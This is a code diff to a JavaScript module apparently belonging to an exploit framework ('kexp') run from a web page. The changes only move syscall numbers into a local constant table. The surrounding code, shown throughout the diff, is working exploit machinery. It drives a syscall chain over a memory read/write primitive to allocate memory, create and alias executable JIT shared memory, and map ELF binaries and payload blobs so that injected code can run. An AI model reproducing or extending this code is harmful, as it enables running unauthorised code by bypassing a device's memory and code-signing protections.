@@ -4,6 +4,15 @@ import { DEFAULT_BINARIES } from "./binaries.js";
 const O_NONBLOCK = 0x4;
 const PROT_RW = 0x3, PROT_RWX = 0x7;
 const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;
+// Keep this module independent of src/utils/syscalls.js. The legacy page used
+// to load that file as a classic script, but the Wobkot page intentionally
+// does not install its hundreds of SYS_* globals.
+const CALL = {
+  MMAP: 0x1dd,
+  JITSHM_CREATE: 0x215,
+  JITSHM_ALIAS: 0x216,
+  PIPE2: 0x2af,
+};
 
 // The bundled paths live in ./binaries.js, which is the only place they are
 // written down. Re-exported here because this module is what payloads import.
@@ -99,7 +108,7 @@ async function mapElf(bytes, path, p, chain, say) {
     throw new Error(`kexp: ${path} is not an ELF binary`);
 
   const size = (elf.length + 0x3fff) & ~0x3fff;
-  const base = await chain.syscall(SYS_MMAP, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
+  const base = await chain.syscall(CALL.MMAP, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
   if (base.low >>> 0 === 0xffffffff || base.low < 0x10000)
     throw new Error(`kexp: ${path} mmap failed`);
   say(`${path} mapped at ${hex(base)} (${hex(size)} bytes)`);
@@ -130,20 +139,20 @@ async function mapExecutable(blob, p, chain) {
     return true;
   };
 
-  const execFd = await chain.syscall(SYS_JITSHM_CREATE, 0, length, PROT_RWX);
+  const execFd = await chain.syscall(CALL.JITSHM_CREATE, 0, length, PROT_RWX);
   if (failed(execFd) || execFd.low >= 0x100000)
     throw new Error("kexp: jitshm_create failed (" + hex(execFd) + ")");
 
-  const entry = await chain.syscall(SYS_MMAP, 0, length, PROT_RWX, MAP_SHARED, execFd, 0);
+  const entry = await chain.syscall(CALL.MMAP, 0, length, PROT_RWX, MAP_SHARED, execFd, 0);
   if (failed(entry) || entry.low < 0x10000)
     throw new Error("kexp: executable mmap failed (" + hex(entry) + ")");
 
   if (!copyInto(entry)) {
-    const writeFd = await chain.syscall(SYS_JITSHM_ALIAS, execFd, PROT_RW);
+    const writeFd = await chain.syscall(CALL.JITSHM_ALIAS, execFd, PROT_RW);
     if (failed(writeFd) || writeFd.low >= 0x100000)
       throw new Error("kexp: writable jitshm alias failed");
 
-    const writable = await chain.syscall(SYS_MMAP, 0, length, PROT_RW, MAP_SHARED, writeFd, 0);
+    const writable = await chain.syscall(CALL.MMAP, 0, length, PROT_RW, MAP_SHARED, writeFd, 0);
     if (failed(writable) || writable.low < 0x10000)
       throw new Error("kexp: writable mmap failed (" + hex(writable) + ")");
     if (!copyInto(writable) || p.read4(entry) >>> 0 !== readU32(blob, 0))
@@ -155,7 +164,7 @@ async function mapExecutable(blob, p, chain) {
 
 async function makePipePair(p, chain) {
   const fds = p.malloc(8, 1);
-  const rv = (await chain.syscall(SYS_PIPE2, fds, O_NONBLOCK)).low | 0;
+  const rv = (await chain.syscall(CALL.PIPE2, fds, O_NONBLOCK)).low | 0;
   if (rv < 0) throw new Error("kexp: pipe2 failed (" + rv + ")");
 
   const readFd = p.read4(fds) >>> 0;
